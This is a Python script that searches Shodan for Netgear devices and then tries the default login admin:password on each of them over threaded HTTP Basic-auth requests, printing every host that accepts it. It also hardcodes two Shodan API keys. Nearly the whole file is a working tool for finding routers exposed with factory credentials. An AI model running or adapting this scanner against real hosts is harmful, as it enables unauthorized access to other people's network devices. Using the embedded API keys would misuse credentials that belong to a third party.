import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import shodan
import base64
import requests
import optparse
import threading

#SHODAN_API_KEY="rHRbstt6uayzsIaTe22AQmyLx12bGfx2"
SHODAN_API_KEY="XnFa919Trc56CS1P6UI9XMmwxLVNuNQj"
dest_path=r'D:\all_python\hikvision\netgear.result'
username='admin'
password='password'
userNamePass=base64.b64encode(username+':'+password)
headers ={
		'Host':'',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
		'Accept':'*/*',
		'Accept-Language':'en;q=0.3',
		'Accept-Encoding':'gzip, deflate,br',
		'Authorization':'Basic '+userNamePass,
		'Connection':'keep-alive',
		'Upgrade-Insecure-Requests':'1',
	}
cookies =dict(language='en',updateTips='true')

def my_shodan(SHODAN_API_KEY,dest_path):
	api = shodan.Shodan(SHODAN_API_KEY)
	try:
		#results = api.search('netgear port:"8443" country:"US"',limit=100)
		results = api.search('netgear')
		print 'Results found: %s' % results['total']
		with open(dest_path,'w') as f:
			for result in results['matches']:
				if result['_shodan']['module'] == 'http-simple-new':
					f.write("http://"+result['ip_str']+":"+str(result['port'])+"\n")
				else:
					f.write(result['_shodan']['module']+"://"+result['ip_str']+":"+str(result['port'])+"\n")

	except shodan.APIError, e:
		print 'ERROR: %s' % e
	
def all_scan(dest_path,headers,cookies):

	def scan(dest_address,headers,cookies):
		try:
			#print dest_address
			r = requests.get(dest_address,headers=headers,cookies=cookies,timeout=2,verify=False)
			if r.status_code == 200:
				print dest_address
		except requests.exceptions.RequestException, e:
			return

	with open(dest_path,'r') as f:
		threads=[]
		for ip in f.readlines():

			headers['Host']=ip.strip('\n')
			dest_address = ip.strip('\n')
			threads.append(threading.Thread(target=scan,args=(dest_address,headers,cookies)))
		print 'start'

		for t in threads:
			t.setDaemon(False)
			t.start()	
#				dest_address = "http://"+ ip.strip('\n')
				# print dest_address
				# r = requests.get(dest_address,headers=headers,cookies=cookies,timeout=2,verify=False)
				# #print r.status_code
				# if r.status_code == 200:
				# 	print 'OK'
				# 	print r.text.encode("utf-8",'ignore')
				# else:
				# 	print '401'
			# except requests.exceptions.RequestException, e:
			# 	#raise e
			# 	continue

def one_scan(remote_address,headers,cookies):
	try:
		headers['Host']=remote_address
#		headers['Referer']="https://" + remote_address +"/MNU_access_setRecovery_index.htm"
		dest_address = "https://"+ remote_address
		print dest_address
		r = requests.get(dest_address,headers=headers,cookies=cookies,timeout=3,verify=False)
		print r.status_code
		print r.text.encode("utf-8",'ignore')
	except requests.exceptions.RequestException, e:
		raise e
		
def main():
	parser = optparse.OptionParser()
	parser.add_option("-r",dest="remote_address",action="store")
	
	(options, args) = parser.parse_args()
	
	if options.remote_address:
		one_scan(options.remote_address,headers,cookies)
	else:
		my_shodan(SHODAN_API_KEY,dest_path)
		all_scan(dest_path,headers,cookies)
	 
if __name__=='__main__':
	main()